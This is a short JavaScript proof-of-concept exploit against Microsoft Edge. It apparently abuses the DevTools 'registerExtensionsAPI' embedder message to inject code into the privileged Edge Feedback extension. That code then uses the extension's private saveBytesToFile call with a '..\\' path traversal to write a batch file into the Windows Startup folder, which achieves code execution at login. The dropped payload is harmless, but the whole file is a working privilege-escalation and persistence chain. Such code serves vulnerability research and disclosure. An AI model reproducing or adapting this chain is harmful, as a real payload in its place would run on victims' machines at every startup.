runProcess();

function runProcess() {
    let script = createStartupFile.toString() + "createStartupFile();";
    DevToolsAPI.sendMessageToEmbedder("registerExtensionsAPI", ["chrome-extension://ihmafllikibpmigkcoadcmckbfhibefp", script]);

    setTimeout(() => {
        let iframe = document.createElement("iframe");
        iframe.src = "chrome-extension://ihmafllikibpmigkcoadcmckbfhibefp/js/feedback.js";
        document.body.appendChild(iframe);
    }, 1000);
}

// Designed to run in the context of the Edge Feedback app.
function createStartupFile() {
    if (window.startupExBatFileSaved) {
        return;
    }

    const batFileContents = "echo Startup bat file\npause";

    let textEncoder = new TextEncoder();
    let encodedData = textEncoder.encode(batFileContents);

    chrome.edgeFeedbackPrivate.saveBytesToFile("..\\..\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\startup.bat",
        encodedData, function () {});

    window.startupExBatFileSaved = true;
}